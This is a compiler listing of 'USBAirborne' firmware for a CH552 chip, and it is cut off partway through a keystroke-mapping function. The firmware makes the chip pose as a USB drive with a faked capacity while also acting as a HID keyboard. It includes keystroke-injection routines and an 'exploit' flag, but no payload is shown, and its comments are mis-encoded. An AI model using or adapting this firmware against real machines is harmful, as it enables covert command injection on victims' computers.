C51 COMPILER V9.60.0.0   MAIN                                                                          07/21/2022 19:09:33 PAGE 1   


C51 COMPILER V9.60.0.0, COMPILATION OF MODULE MAIN
OBJECT MODULE PLACED IN .\Obj\Main.obj
COMPILER INVOKED BY: C:\Keil\C51\BIN\C51.EXE Main.C LARGE OMF2 OPTIMIZE(8,SPEED) BROWSE INCDIR(..\) DEBUG CODE PRINT(.\Obj\Main.lst)
                    - PAGEWIDTH(132) PAGELENGTH(5000) TABS(2) PREPRINT(.\Obj\Main.i) OBJECT(.\Obj\Main.obj)

line level    source

   1          /************************************** INFO ***********************************
   2          * File Name          : Main.C
   3          * Author             : PushEAX
   4          * Version            : V2.1
   5          * Date               : 2022-3-24 23:10:12
   6          * Description        : USBAirborne Firmware
   7          *                      USB Mass Storage Device & HID Device on CH552
   8          *******************************************************************************/
   9          #include <stdio.h>
  10          #include <string.h>
  11          #include "CH554.H"
  12          #include "Debug.H"
  13          #include "keyboard.h"
  14          #pragma  NOAREGS
  15          
  16          #define THIS_ENDP0_SIZE     DEFAULT_ENDP0_SIZE
  17          #define UsbSetupBuf     ((PUSB_SETUP_REQ)Ep0Buffer)
  18          UINT8X  Ep0Buffer[THIS_ENDP0_SIZE+2]    _at_ 0x0000;                                      //Endpoint 0
  19          UINT8X  Ep1Buffer[2 * MAX_PACKET_SIZE]  _at_ THIS_ENDP0_SIZE + 2 + MAX_PACKET_SIZE;       //Endpoint 1 USB Mass Storage D
             -evice
  20          UINT8X  Ep2Buffer[2 * MAX_PACKET_SIZE]  _at_ THIS_ENDP0_SIZE + 2 + 4 * MAX_PACKET_SIZE;   //Endpoint 2 HID Keyboard
  21          
  22          UINT8   UsbConfig = 0;
  23          UINT8   UsbReady  = 0;
  24          UINT8   IsHIDDataSent   = 0;
  25          UINT8   IsHIDSendExploit  = 0;
  26          sbit Key_ModeSelect = P1^1;     //¥Ê¥¢…Ë±∏ƒ£ Ω—°‘Ò∞¥≈•
  27          
  28          UINT8 HIDData[] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}; //∞¥º¸ ˝æ›±®Œƒ
  29          UINT8C HIDReportDescriptor[] =  //HID√Ë ˆ∑˚
  30          {
  31              0x05, 0x01, 0x09, 0x06, 0xa1, 0x01, 0x05, 0x07,
  32              0x19, 0xe0, 0x29, 0xe7, 0x15, 0x00, 0x25, 0x01,
  33              0x75, 0x01, 0x95, 0x08, 0x81, 0x02, 0x95, 0x01,
  34              0x75, 0x08, 0x81, 0x01, 0x95, 0x03, 0x75, 0x01,
  35              0x05, 0x08, 0x19, 0x01, 0x29, 0x03, 0x91, 0x02,
  36              0x95, 0x05, 0x75, 0x01, 0x91, 0x01, 0x95, 0x06,
  37              0x75, 0x08, 0x15, 0x00, 0x25, 0x65, 0x05, 0x07,
  38              0x19, 0x00, 0x29, 0x65, 0x81, 0x00, 0xc0     
  39          };
  40          
  41          UINT8C  MyDevDescr[] =      // …Ë±∏√Ë ˆ∑˚
  42          {
  43              0x12, 0x01, 0x10, 0x01,
  44              0x00, 0x00, 0x00, THIS_ENDP0_SIZE,
  45              0x44, 0x33, 0x33, 0x35,                                 // ≥ß…ÃID∫Õ≤˙∆∑ID
  46              0x00, 0x01, 0x01, 0x02,
  47              0x00, 0x01
  48          };
  49          
  50          UINT8C  MyCfgDescr[] =      // ≈‰÷√√Ë ˆ∑˚, Ω”ø⁄√Ë ˆ∑˚, ∂Àµ„√Ë ˆ∑˚
  51          {
  52              0x09, 0x02, 0x39, 0x00, 0x02, 0x01, 0x00, 0x80, 0x64,   // ≈‰÷√√Ë ˆ∑˚
  53            
  54              0x09, 0x04, 0x00, 0x00, 0x02, 0x08, 0x06, 0x50, 0x00,   // U≈ÃΩ”ø⁄√Ë ˆ∑˚
  55              0x07, 0x05, 0x01, 0x02, 0x40, 0x00, 0x00,               // ≈˙¡øœ¬¥´∂Àµ„
  56              0x07, 0x05, 0x81, 0x02, 0x40, 0x00, 0x00,               // ≈˙¡ø…œ¥´∂Àµ„
  57             
  58              0x09, 0x04, 0x01, 0x00, 0x01, 0x03, 0x01, 0x01, 0x00,                         //º¸≈ÃΩ”ø⁄√Ë ˆ∑˚
  59              0x09, 0x21, 0x11, 0x01, 0x00, 0x01, 0x22, sizeof(HIDReportDescriptor), 0x00,  //HID¿‡√Ë ˆ∑˚
  60              0x07, 0x05, 0x82, 0x03, sizeof(HIDData), 0x00, 0x00                           //∂Àµ„√Ë ˆ∑˚
  61          };
  62          
  63          UINT8C  MyLangDescr[] =     // ”Ô—‘√Ë ˆ∑˚
  64          {
  65              4, 0x03, 0x09, 0x04
  66          };
  67          
  68          UINT8C  MyManuInfo[] =      // ≥ßº“–≈œ¢
  69          {
  70              14, 0x03, 'U', 0, 'S', 0, 'B', 0, '2', 0, '.', 0, '0', 0
  71          };
  72          
  73          UINT8C  MyProdInfo[] =      // ≤˙∆∑–≈œ¢
  74          {
  75              12, 0x03, 'U', 0, 'S', 0, 'B', 0, ' ', 0, ' ', 0
  76          };
  77          
  78          // Mass Storage
  79          UINT8C  MAX_LUN[] = { 0 };
  80          
  81          UINT8C  DBINQUITY_CD_ROM[] =       //CD-ROM INQUIRY inform
  82            {
  83              0x05,          /* 05:CD-ROM Device*/
  84              0x00,          /* 00:DRIVE_FIXED*/
  85              0x04,          /* Version: No conformance claim to standard 04 02*/
  86              0x02,
  87          
  88              0x1f,          /* Additional Length */
  89              0x00,          /* SCCS = 1: Storage Controller Component */
  90              0x00,
  91              0x00,
  92              /* Vendor Identification */
  93              ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ',       /* Manufacturer: 8 bytes */
  94              /* Product Identification */
  95              'U', 'l', 't', 'r', 'a', ' ', 'U', 'S',       /* Product : 16 Bytes */
  96              'B', '2', '.', '0', ' ', ' ', ' ', ' ',
  97              /* Product Revision Level */
  98              '2', '.', '0', ' '                            /* Version : 4 Bytes */
  99            };
 100          
 101          UINT8C  DBINQUITY_USB_Drive[] =       //USB Drive INQUIRY inform
 102            {
 103              0x00,          /* 00:Direct Access Device*/
 104              0x80,          /* 80:DRIVE_REMOVABLE*/
 105              0x04,          /* Version: No conformance claim to standard 04 02*/
 106              0x02,
 107          
 108              0x1f,          /* Additional Length */
 109              0x00,          /* SCCS = 1: Storage Controller Component */
 110              0x00,
 111              0x00,
 112              /* Vendor Identification */
 113              ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ',       /* Manufacturer: 8 bytes */
 114              /* Product Identification */
 115              'U', 'l', 't', 'r', 'a', ' ', 'U', 'S',       /* Product : 16 Bytes */
 116              'B', '2', '.', '0', ' ', ' ', ' ', ' ',
 117              /* Product Revision Level */
 118              '2', '.', '0', ' '                            /* Version : 4 Bytes */
 119            };
 120          
 121          
 122          // –ﬁ∏ƒ∫„∂®“Âµƒ ±∫Ú◊¢“‚–ﬁ∏ƒ≤¡≥˝∫Ø ˝£¨µ±«∞Œ™≤¡≥˝4k∫Ø ˝°£–Ë“™œ‡”¶–ﬁ∏ƒ’‚∏ˆ∫Ø ˝º¥ø…°£
 123          #define DISK_SEC_LEN    (UINT32)(4096UL)                                // …»«¯¥Û–° 4KB
 124          #define DISK_SEC_NUM    (UINT32)(1024UL)                                // ◊‹…»«¯ ˝
 125          #define DISK_SEC_LAST   (UINT32)(2047999UL)                             // Œ±◊∞≥…8GµƒU≈Ã 1919999UL DISK_SEC_NUM-1
 126          
 127          
 128          UINT8C  DBCAPACITY[] =      // Œ±◊∞µƒ»›¡ø±®Œƒ
 129          {
 130              (DISK_SEC_LAST >> 24) & 0xFF, (DISK_SEC_LAST >> 16) & 0xFF, (DISK_SEC_LAST >> 8) & 0xFF, DISK_SEC_LAST & 0xFF, (DI
             -SK_SEC_LEN >> 24) & 0xFF, (DISK_SEC_LEN >> 16) & 0xFF, (DISK_SEC_LEN >> 8) & 0xFF, DISK_SEC_LEN & 0xFF
 131          };
 132          
 133          UINT8C  modesense3F[] =     // ŒÔ¿Ì…»«¯ ˝
 134          {
 135              0x0b, 0x00, 0x00, 0x08, (DISK_SEC_NUM >> 24) & 0xFF, (DISK_SEC_NUM >> 16) & 0xFF, (DISK_SEC_NUM >> 8) & 0xFF, DISK
             -_SEC_NUM & 0xFF, 00, 00, 02, 00
 136          };
 137          
 138          UINT8C  mode5sense3F[] =    // ŒÔ¿Ì…»«¯ ˝
 139          {
 140              0x00, 0x06, 0x00, 0x00, 0x08, 0x00, 0x00, 0x08, (DISK_SEC_NUM >> 24) & 0xFF, (DISK_SEC_NUM >> 16) & 0xFF, (DISK_SE
             -C_NUM >> 8) & 0xFF, DISK_SEC_NUM & 0xFF, 00, 00, 02, 00
 141          };
 142          
 143          typedef union _CBWCB
 144          {
 145              unsigned char buf1[16];
 146          } CBWCB;
 147          
 148          typedef  union _MASS_PARA
 149          {
 150              unsigned char buf[64];
 151              struct  _SENSE
 152              {
 153                  unsigned char ErrorCode;
 154                  unsigned char Reserved1;
 155                  unsigned char SenseKey;
 156                  unsigned char Information[4];
 157                  unsigned char AddSenseLength;
 158                  unsigned char Reserved2[4];
 159                  unsigned char AddSenseCode;
 160                  unsigned char AddSenseCodeQua;
 161                  unsigned char Reserved3[4];
 162              } Sense;
 163              struct  _CBW
 164              {
 165                  unsigned char dCBWsig[4];
 166                  unsigned char dCBWTag[4];
 167                  unsigned long dCBWDatL;
 168                  unsigned char bmCBWFlags;
 169                  unsigned char bCBWLUN;
 170                  unsigned char bCBWCBLength;
 171                  CBWCB        cbwcb;
 172              } cbw;
 173          } MASS_PARA;
 174          
 175          enum _HOST_DEV_DISAGREE
 176          {
 177              CASEOK = 0,
 178              CASE1,
 179              CASE2,
 180              CASE3,
 181              CASE4,
 182              CASE5,
 183              CASE6,
 184              CASE7,
 185              CASE8,
 186              CASE9,
 187              CASE10,
 188              CASE11,
 189              CASE12,
 190              CASE13,
 191              CASECBW,
 192              CASECMDFAIL
 193          };
 194          
 195          #define FORMAT_UNIT             0x04
 196          #define INQUIRY                 0x12
 197          #define MODE_SELECT             0x15
 198          #define MODE_SENSE5             0x5A
 199          #define MODE_SENSE              0x1A
 200          #define PER_RES_IN              0x5E
 201          #define PER_RES_OUT             0x5F
 202          #define PRE_OR_MED              0x1E
 203          #define READ                    0x28
 204          #define READ_CAPACITY           0x25
 205          #define RELEASE                 0x17
 206          #define REQUEST_SENSE           0x03
 207          #define RESERVE                 0x16
 208          #define STA_STO_UNIT            0x1B
 209          #define SYN_CACHE               0x35
 210          #define TES_UNIT                0x00
 211          #define VERIFY                  0x2F
 212          #define WRITE                   0x2A
 213          #define WRITE_BUFFER            0x3B
 214          #define FORMATCAP               0x23
 215          #define READTOC                 0x43
 216          #define GET_EVE_STA_NOT         0x4A
 217          #define GET_CONF                0x46
 218          #define PROFILE_LIST                0x46
 219          
 220          
 221          union
 222          {
 223              unsigned long mDataLength;                      //  ˝æ›≥§∂»
 224              unsigned char mdataLen[4];
 225          } LEN;
 226          
 227          MASS_PARA idata MassPara;
 228          unsigned char mdCBWTag[4];                          // dCBWTag
 229          bit CH375BULKUP;                                    //  ˝æ›…œ¥´
 230          bit CH375BULKDOWN;                                  //  ˝æ›œ¬¥´
 231          bit CH375CSW;                                       // CSW…œ¥´±Í÷æ
 232          unsigned char BcswStatus;                           // CSW◊¥Ã¨
 233          unsigned char mSenseKey;
 234          unsigned char mASC;
 235          bit FSTALL;                                         //  ˝æ›¥ÌŒÛ±Í÷æ
 236          bit lastFSTALL;
 237          bit pBuf_ReSelect = 0;
 238          UINT32 Locate_Addr;
 239          unsigned char *pBuf;
 240          
 241          
 242          /*******************************************************************************
 243          * Function Name  : USBDeviceCfg()
 244          * Description    : USB…Ë±∏ƒ£ Ω≈‰÷√
 245          * Input          : None
 246          * Output         : None
 247          * Return         : None
 248          *******************************************************************************/
 249          void    InitUSB_Device(void)                                    // ≥ı ºªØUSB…Ë±∏
 250          {
 251   1          USB_CTRL = 0x00;                                            // «Âø’USBøÿ÷∆ºƒ¥Ê∆˜
 252   1          USB_CTRL &= ~bUC_HOST_MODE;                                 // ∏√ŒªŒ™—°‘Ò…Ë±∏ƒ£ Ω
 253   1          USB_CTRL |=  bUC_DEV_PU_EN | bUC_INT_BUSY | bUC_DMA_EN;     // USB…Ë±∏∫Õƒ⁄≤ø…œ¿≠ πƒ‹,‘⁄÷–∂œ∆⁄º‰÷–∂œ±Í÷æŒ¥«Â≥˝«∞◊‘∂
             -Ø∑µªÿNAK
 254   1          USB_DEV_AD = 0x00;                                          // …Ë±∏µÿ÷∑≥ı ºªØ
 255   1          USB_CTRL &= ~bUC_LOW_SPEED;
 256   1          UDEV_CTRL &= ~bUD_LOW_SPEED;                                // —°‘Ò»´ÀŸ12Mƒ£ Ω£¨ƒ¨»œ∑Ω Ω
 257   1          UDEV_CTRL = bUD_PD_DIS;                                     // Ω˚÷πDP/DMœ¬¿≠µÁ◊Ë
 258   1          UDEV_CTRL |= bUD_PORT_EN;                                   //  πƒ‹ŒÔ¿Ì∂Àø⁄
 259   1        
 260   1        UEP1_DMA = Ep1Buffer;                                         // ∂Àµ„1  ˝æ›¥´ ‰µÿ÷∑£®U≈Ã£©
 261   1          UEP4_1_MOD = 0xC0;                                          // ∂Àµ„1…œœ¬¥´ª∫≥Â«¯£ª∂Àµ„0µ•64◊÷Ω⁄ ’∑¢ª∫≥Â«¯
 262   1          UEP1_CTRL = bUEP_AUTO_TOG | UEP_T_RES_NAK | UEP_R_RES_ACK;  // ∂Àµ„1◊‘∂Ø∑≠◊™Õ¨≤Ω±Í÷æŒª£¨IN ¬ŒÒ∑µªÿNAK£¨OUT∑µªÿACK
 263   1        UEP0_DMA = Ep0Buffer;                                         // ∂Àµ„0 ˝æ›¥´ ‰µÿ÷∑
 264   1          UEP0_CTRL = UEP_R_RES_ACK | UEP_T_RES_NAK;                  //  ÷∂Ø∑≠◊™£¨OUT ¬ŒÒ∑µªÿACK£¨IN ¬ŒÒ∑µªÿNAK
 265   1        UEP0_T_LEN = 0;
 266   1          UEP1_T_LEN = 0;                                             // ‘§ π”√∑¢ÀÕ≥§∂»“ª∂®“™«Âø’
 267   1        UEP2_DMA = Ep2Buffer;                                         // ∂Àµ„2  ˝æ›¥´ ‰µÿ÷∑£®º¸≈Ã£©
 268   1          UEP2_3_MOD = bUEP2_TX_EN;
 269   1          UEP2_CTRL = bUEP_AUTO_TOG | UEP_T_RES_NAK;
 270   1          UEP2_T_LEN = 0;
 271   1      
 272   1      
 273   1          USB_INT_EN |= bUIE_SUSPEND;                                 //  πƒ‹…Ë±∏π“∆÷–∂œ
 274   1          USB_INT_EN |= bUIE_TRANSFER;                                //  πƒ‹USB¥´ ‰ÕÍ≥…÷–∂œ
 275   1          USB_INT_EN |= bUIE_BUS_RST;                                 //  πƒ‹…Ë±∏ƒ£ ΩUSB◊‹œﬂ∏¥Œª÷–∂œ
 276   1          USB_INT_FG |= 0x1F;                                         // «Â÷–∂œ±Í÷æ
 277   1          IE_USB = 1;                                                 //  πƒ‹USB÷–∂œ
 278   1          EA = 1;                                                     // ‘ –Ìµ•∆¨ª˙÷–∂œ
 279   1      }
 280          
 281          
 282          sbit SPI_CS = P1 ^ 4;                                           //SPI FLASH ∆¨—°£¨ ”PCB≤ºœﬂ–ﬁ∏ƒ
 283          #define SPI_Tx( d )    { SPI0_DATA = d; while(S0_FREE == 0); }
 284          #define SPI_Rx( d )    { SPI0_DATA = 0xFF; while(S0_FREE == 0); d = SPI0_DATA; }
 285          
 286          /*******************************************************************************
 287          * Function Name  : InitHostSPI0( void )
 288          * Description    : SPI0÷˜ª˙ƒ£ Ω≥ı ºªØ
 289          * Input          : None
 290          * Output         : None
 291          * Return         : None
 292          *******************************************************************************/
 293          void InitHostSPI0(void)
 294          {
 295   1          SPI0_SETUP &= ~(bS0_MODE_SLV | bS0_BIT_ORDER);              // Masterƒ£ Ω, ∏ﬂŒª‘⁄«∞
 296   1          SPI0_CTRL = bS0_SCK_OE | bS0_MOSI_OE;                       // ƒ£ Ω0
 297   1          SPI0_CK_SE = 0x02;                                          // 2∑÷∆µ
 298   1          P1_MOD_OC |= (bMOSI | bMISO | bSCK | bSCS);
 299   1          P1_DIR_PU |= (bMOSI | bMISO | bSCK | bSCS);
 300   1      }
 301          
 302          /*******************************************************************************
 303          * Function Name  : ReadFlashStatus
 304          * Description    : ”√¿¥∂¡»°◊¥Ã¨ºƒ¥Ê∆˜,≤¢∑µªÿ◊¥Ã¨ºƒ¥Ê∆˜µƒ÷µ
 305          * Input          : None
 306          * Output         : None
 307          * Return         : ExFlashRegStatus
 308          *******************************************************************************/
 309          UINT8 ReadFlashStatus(void)
 310          {
 311   1          UINT8 FlashStatus;
 312   1      
 313   1          SPI_CS = 0;
 314   1          SPI_Tx(0x05);                                       // Read Status Register
 315   1          SPI_Rx(FlashStatus);                                // ∂¡»°◊¥Ã¨ºƒ¥Ê∆˜
 316   1          SPI_CS = 1;
 317   1      
 318   1          return FlashStatus;
 319   1      }
 320          
 321          /*******************************************************************************
 322          * Function Name  : WaitFlashBusy
 323          * Description    : µ»¥˝–æ∆¨ø’œ–(‘⁄÷¥––Byte-Program, Sector-Erase, Block-Erase, Chip-Erase≤Ÿ◊˜∫Û)
 324          * Input          : None
 325          * Output         : None
 326          * Return         : None
 327          *******************************************************************************/
 328          void WaitFlashBusy(void)
 329          {
 330   1          while((ReadFlashStatus()) & 0x01 == 0x01);          // µ»¥˝÷±µΩFlashø’œ–
 331   1      }
 332          
 333          /*******************************************************************************
 334          * Function Name  : WriteFlashStatus
 335          * Description    : Õ˘◊¥Ã¨ºƒ¥Ê∆˜¿Ô–¥“ª∏ˆ◊÷Ω⁄
 336          * Input          : status -–¥»Îµƒ ˝æ›
 337          * Output         : None
 338          * Return         : None
 339          *******************************************************************************/
 340          void WriteFlashStatus(UINT8 status)
 341          {
 342   1          SPI_CS = 0;
 343   1          SPI_Tx(0x01);                                       // Write Status Register
 344   1          SPI_Tx(status);                                     // ∏ƒ±‰ºƒ¥Ê∆˜¿ÔBPxªÚ’ﬂBPL(÷ª”–2,3,4,5,7Œªø…“‘∏ƒ–¥)
 345   1          SPI_CS = 1;
 346   1      }
 347          
 348          /*******************************************************************************
 349          * Function Name  : WriteFlashForbidden
 350          * Description    : –¥Ω˚÷π
 351          * Input          : None
 352          * Output         : None
 353          * Return         : None
 354          *******************************************************************************/
 355          void WriteFlashForbidden(void)
 356          {
 357   1          SPI_CS = 0;
 358   1          SPI_Tx(0x04);
 359   1          SPI_CS = 1;
 360   1      }
 361          
 362          /*******************************************************************************
 363          * Function Name  : WriteFlashEnable
 364          * Description    : –¥ πƒ‹, Õ¨—˘ø…“‘”√”⁄ πƒ‹–¥◊¥Ã¨ºƒ¥Ê∆˜
 365          * Input          : None
 366          * Output         : None
 367          * Return         : None
 368          *******************************************************************************/
 369          void WriteFlashEnable(void)
 370          {
 371   1          SPI_CS = 0;
 372   1          SPI_Tx(0x06);                                       // Write Enable
 373   1          SPI_CS = 1;
 374   1      }
 375          
 376          /*******************************************************************************
 377          * Function Name  : CheckFlashWriteEnable
 378          * Description    : ºÏ≤È≤¡–¥≤Ÿ◊˜«∞WELŒª «∑ÒŒ™1
 379          * Input          : None
 380          * Output         : None
 381          * Return         : None
 382          *******************************************************************************/
 383          void CheckFlashWriteEnable(void)
 384          {
 385   1          UINT8 WRENStatus;
 386   1          
 387   1          WRENStatus = ReadFlashStatus();                     // ∂¡»°◊¥Ã¨register
 388   1          if((WRENStatus & 0x02) != 0x02)                     // ºÏ≤ÈWELŒª÷√Œª
 389   1          {
 390   2              WriteFlashEnable();                             // »Áπ˚Œ¥÷√1Ω¯––œ‡”¶¥¶¿Ì,»Á∂‘∆‰Ω¯–––¥ πƒ‹≤Ÿ◊˜
 391   2          }
 392   1      }
 393          
 394          /*******************************************************************************
 395          * Function Name  : EraseFlash
 396          * Description    : ≤¡≥˝4K Flash  ≤¡≥˝“ª∏ˆ…»«¯
 397          * Input          : Dst_Addr 0-1 ffff ffff ,«Â≥˝»Œ“‚µÿ÷∑À˘‘⁄µƒ…»«¯°£
 398          * Output         : None
 399          * Return         : None
 400          *******************************************************************************/
 401          void EraseFlash(UINT32 Dst_Addr)
 402          {
 403   1          CheckFlashWriteEnable();
 404   1          SPI_CS = 0;
 405   1          SPI_Tx(0x20);                                       // …»«¯≤¡≥˝√¸¡Ó
 406   1          SPI_Tx(((Dst_Addr & 0xFFFFFF) >> 16));              // send 3 address bytes
 407   1          SPI_Tx(((Dst_Addr & 0xFFFF) >> 8));
 408   1          SPI_Tx(Dst_Addr & 0xFF);
 409   1          SPI_CS = 1;
 410   1          WaitFlashBusy();
 411   1      }
 412          
 413          /*******************************************************************************
 414          * Function Name  : ByteReadFlash
 415          * Description    : ∂¡»°“ª∏ˆµÿ÷∑ƒ⁄“ª∏ˆ◊÷Ω⁄µƒ ˝æ›.∑µªÿ∂¡»°µƒ ˝æ›
 416          * Input          : UINT32 StarAddr -Destination Address 000000H - 1FFFFFH
 417          * Output         : None
 418          * Return         : byte -∂¡»°µƒ ˝æ›
 419          *******************************************************************************/
 420          UINT8 ByteReadFlash(UINT32 StarAddr)
 421          {
 422   1          UINT8 dat = 0;
 423   1      
 424   1          SPI_CS = 0;
 425   1          SPI_Tx(0x03);                                       // read command
 426   1          SPI_Tx(((StarAddr & 0xFFFFFF) >> 16));              // send 3 address bytes
 427   1          SPI_Tx(((StarAddr & 0xFFFF) >> 8));
 428   1          SPI_Tx(StarAddr & 0xFF);
 429   1          SPI_Rx(dat);
 430   1          SPI_CS = 1;
 431   1      
 432   1          return dat;                                         // return one byte read
 433   1      }
 434          
 435          /*******************************************************************************
 436          * Function Name  : ByteWriteFlash
 437          * Description    : –¥ ˝æ›
 438          * Input          : StarAddr  -Destination Address 000000H - 1FFFFFH
 439          *                  dat -“™–¥»Îµƒ ˝æ›
 440          * Output         : None
 441          * Return         : None
 442          *******************************************************************************/
 443          void ByteWriteFlash(UINT32 StarAddr, UINT8 dat)
 444          {
 445   1          WriteFlashEnable();
 446   1          SPI_CS = 0;
 447   1          SPI_Tx(0x02);                                       // Page Program
 448   1          SPI_Tx(((StarAddr & 0xFFFFFF) >> 16));              // ∑¢ÀÕ3◊÷Ω⁄µÿ÷∑
 449   1          SPI_Tx(((StarAddr & 0xFFFF) >> 8));
 450   1          SPI_Tx(StarAddr & 0xFF);
 451   1          SPI_Tx(dat);                                        // ∑¢ÀÕ“™–¥µƒ ˝æ›
 452   1          SPI_CS = 1;
 453   1          WaitFlashBusy();
 454   1      }
 455          
 456          /*******************************************************************************
 457          * Function Name  : BulkReadFlash
 458          * Description    : ∂¡»°∆ ºµÿ÷∑(StarAddr)ƒ⁄∂‡∏ˆ◊÷Ω⁄(Len)µƒ ˝æ›.¥Ê»Îª∫≥Â«¯RcvBuffer÷–
 459          * Input          : StarAddr -Destination Address 000000H - 1FFFFFH
 460                             Len ∂¡»° ˝æ›≥§∂»
 461                             RcvBuffer Ω” ’ª∫≥Â«¯∆ ºµÿ÷∑
 462          * Output         : None
 463          * Return         : None
 464          *******************************************************************************/
 465          void BulkReadFlash(UINT32 StarAddr, UINT16 Len, PUINT8 RcvBuffer)
 466          {
 467   1          UINT16 i;
 468   1      
 469   1          SPI_CS = 0;
 470   1          SPI_Tx(0x0b);                                       // fast read command
 471   1          SPI_Tx(((StarAddr & 0xFFFFFF) >> 16));              // send 3 address bytes
 472   1          SPI_Tx(((StarAddr & 0xFFFF) >> 8));
 473   1          SPI_Tx(StarAddr & 0xFF);
 474   1          SPI_Tx(0x00);
 475   1          for(i = 0; i < Len; i++)
 476   1          {
 477   2              SPI_Rx(RcvBuffer[i]);                           // Ω” ’ ˝æ›
 478   2          }
 479   1          SPI_CS = 1;
 480   1      }
 481          
 482          /*******************************************************************************
 483          * Function Name  : BulkWriteFlash
 484          * Description    : Ω´ ˝æ›–¥»ÎÕ‚≤øFlash
 485          * Input          : StarAddr  -Destination Address 000000H - 1FFFFFH
 486                             Len ∑¢ÀÕ ˝æ›≥§∂»
 487          *                  SendBuffer -∑¢ÀÕ ˝æ›ª∫≥Â«¯
 488          * Output         : None
 489          * Return         : None
 490          *******************************************************************************/
 491          void BulkWriteFlash(UINT32 StarAddr, UINT16 Len, PUINT8 SendBuffer)
 492          {
 493   1          UINT16 i;
 494   1      
 495   1          WaitFlashBusy();                                // µ»¥˝Flash√¶Ω· ¯
 496   1          WriteFlashStatus(0x00);                         // …Ë÷√–æ∆¨Œ™Œﬁ±£ª§
 497   1          WriteFlashEnable();                             // –¥ πƒ‹
 498   1      
 499   1          SPI_CS = 0;
 500   1          SPI_Tx(0x02);                                   // Page Program
 501   1          SPI_Tx(((StarAddr & 0xFFFFFF) >> 16));          // ∑¢ÀÕ3◊÷Ω⁄µÿ÷∑
 502   1          SPI_Tx(((StarAddr & 0xFFFF) >> 8));
 503   1          SPI_Tx(StarAddr & 0xFF);
 504   1          for(i = 0; i < Len; i++)
 505   1          {
 506   2              SPI_Tx(SendBuffer[i]);
 507   2          }
 508   1          SPI_CS = 1;
 509   1          WriteFlashForbidden();                          // –¥Ω˚÷π
 510   1          WaitFlashBusy();                                // µ»¥˝Flash√¶Ω· ¯
 511   1      }
 512          /*******************************************************************************
 513          * Function Name  : HIDSendData
 514          * Description    : ∂Àµ„2∑¢ÀÕ ˝æ›£¨º¥HID ˝æ›
 515          * Input          : None
 516          * Output         : None
 517          * Return         : None
 518          *******************************************************************************/
 519          void HIDSendData()
 520          {
 521   1        memcpy( Ep2Buffer, HIDData, sizeof(HIDData));
 522   1        UEP2_T_LEN = sizeof(HIDData);
 523   1        UEP2_CTRL = UEP2_CTRL & ~ MASK_UEP_T_RES | UEP_T_RES_ACK;
 524   1      }
 525          
 526          /*******************************************************************************
 527          * Function Name  : SendKey
 528          * Description    : ƒ£ƒ‚º¸≈Ã∞¥œ¬ƒ≥º¸
 529          * Input          : FunctionKey  π¶ƒ‹º¸
 530                             Key          ∆’Õ®∞¥º¸
 531                              
 532          * Output         : None
 533          * Return         : None
 534          *******************************************************************************/
 535          void SendKey(UINT8 FunctionKey, UINT8 Key)
 536          {
 537   1        IsHIDDataSent = 0;
 538   1        HIDData[0] = FunctionKey;
 539   1        HIDData[2] = Key;
 540   1        HIDSendData();
 541   1        while(!IsHIDDataSent);
 542   1        mDelaymS(5);
 543   1        
 544   1        IsHIDDataSent = 0;
 545   1        HIDData[0] = KB_NULL;
 546   1        HIDData[2] = KB_NULL; 
 547   1        HIDSendData();
 548   1        while(!IsHIDDataSent);
 549   1        mDelaymS(5);
 550   1      }
 551          
 552          
 553          /*******************************************************************************
 554          * Function Name  : SendString
 555          * Description    : ƒ£ƒ‚º¸≈Ã∞¥œ¬“ª¥Æ◊÷∑˚¥Æ
 556          * Input          : None
 557          * Output         : None
 558          * Return         : None
 559          *******************************************************************************/
 560          void SendString(UINT8 *s,UINT8 num)
 561          {
 562   1        UINT8 i;
 563   1        for(i=0;i<num;i++)
 564   1        {
 565   2          if((s[i]>='a')&&(s[i]<='z')){
 566   3            SendKey(KB_NULL,s[i]-'a'+KB_A);
 567   3          }else if((s[i]>='A')&&(s[i]<='Z')){
 568   3            SendKey(KB_LeftShift,s[i]-'A'+KB_A);
 569   3          }else if((s[i]>='1')&&(s[i]<='9')){
 570   3            SendKey(KB_NULL,s[i]-'1'+KB_1);
 571   3          }else{
 572   3            switch(s[i]){
 573   4              case '0':
 574   4                SendKey(KB_NULL,KB_0);
 575   4                break;
 576   4              case ' ':
 577   4                SendKey(KB_NULL,KB_SPACE);
 578   4                break;
 579   4              case '!':
 580   4                SendKey(KB_LeftShift,KB_1);
 581   4                break;
 582   4              case '@':
 583   4                SendKey(KB_LeftShift,KB_2);
 584   4                break;
 585   4              case '#':
 586   4                SendKey(KB_LeftShift,KB_3);
 587   4                break;
 588   4              case '$':
 589   4                SendKey(KB_LeftShift,KB_4);
 590   4                break;
 591   4              case '%':
 592   4                SendKey(KB_LeftShift,KB_5);
 593   4                break;
 594   4              case '^':
 595   4                SendKey(KB_LeftShift,KB_6);
 596   4                break;
 597   4              case '&':
 598   4                SendKey(KB_LeftShift,KB_7);
 599   4                break;
 600   4              case '*':
 601   4                SendKey(KB_LeftShift,KB_8);
 602   4                break;
 603   4              case '(':
 604   4                SendKey(KB_LeftShift,KB_9);
 605   4                break;
 606   4              case ')':
 607   4                SendKey(KB_LeftShift,KB_0);
 608   4                break;
 609   4              case '-':
 610   4                SendKey(KB_NULL,KB_SUB);
 611   4                break;
 612   4              case '_':
 613   4                SendKey(KB_LeftShift,KB_SUB);
 614   4                break;
 615   4              case '=':
 616   4                SendKey(KB_NULL,KB_EQUAL);
 617   4                break;
 618   4              case '+':
 619   4                SendKey(KB_LeftShift,KB_EQUAL);
 620   4                break;
 621   4              case '[':
 622   4                SendKey(KB_NULL,KB_LEFT_BRACKET);
 623   4                break;
 624   4              case '{':
 625   4                SendKey(KB_LeftShift,KB_LEFT_BRACKET);
 626   4                break;
 627   4              case ']':
 628   4                SendKey(KB_NULL,KB_RIGHT_BRACKET);
 629   4                break;
 630   4              case '}':
 631   4                SendKey(KB_LeftShift,KB_RIGHT_BRACKET);
 632   4                break;
 633   4              case '\\':
 634   4                SendKey(KB_NULL,KB_VERTICAL_LINE);
 635   4                break;
 636   4              case '|':
 637   4                SendKey(KB_LeftShift,KB_VERTICAL_LINE);
 638   4                break;
 639   4              case ';':
 640   4                SendKey(KB_NULL,KB_SEMICOLON);
 641   4                break;
 642   4              case ':':
 643   4                SendKey(KB_LeftShift,KB_SEMICOLON);
 644   4                break;
 645   4              case '`':
 646   4                SendKey(KB_NULL,KB_WAVE);
 647   4                break;
 648   4              case '~':
 649   4                SendKey(KB_LeftShift,KB_WAVE);
